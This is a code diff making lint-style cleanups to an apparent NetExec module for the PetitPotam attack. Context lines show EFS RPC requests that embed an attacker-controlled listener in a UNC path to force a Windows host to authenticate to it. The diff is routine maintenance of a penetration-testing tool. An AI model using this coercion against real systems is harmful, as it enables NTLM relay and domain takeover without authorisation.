@@ -67,8 +67,8 @@ class NXCModule:
                     host.signing,
                     petitpotam=True,
                 )
-            except Exception as e:
-                context.log.debug(f"Error updating petitpotam status in database")
+            except Exception:
+                context.log.debug("Error updating petitpotam status in database")
 
 
 class DCERPCSessionError(DCERPCException):
@@ -270,7 +270,7 @@ def efs_rpc_open_file_raw(dce, listener, context=None):
         request = EfsRpcOpenFileRaw()
         request["fileName"] = "\\\\%s\\test\\Settings.ini\x00" % listener
         request["Flag"] = 0
-        resp = dce.request(request)
+        dce.request(request)
 
     except Exception as e:
         if str(e).find("ERROR_BAD_NETPATH") >= 0:
@@ -284,7 +284,7 @@ def efs_rpc_open_file_raw(dce, listener, context=None):
             try:
                 request = EfsRpcEncryptFileSrv()
                 request["FileName"] = "\\\\%s\\test\\Settings.ini\x00" % listener
-                resp = dce.request(request)
+                dce.request(request)
             except Exception as e:
                 if str(e).find("ERROR_BAD_NETPATH") >= 0:
                     context.log.info("[+] Got expected ERROR_BAD_NETPATH exception!!")
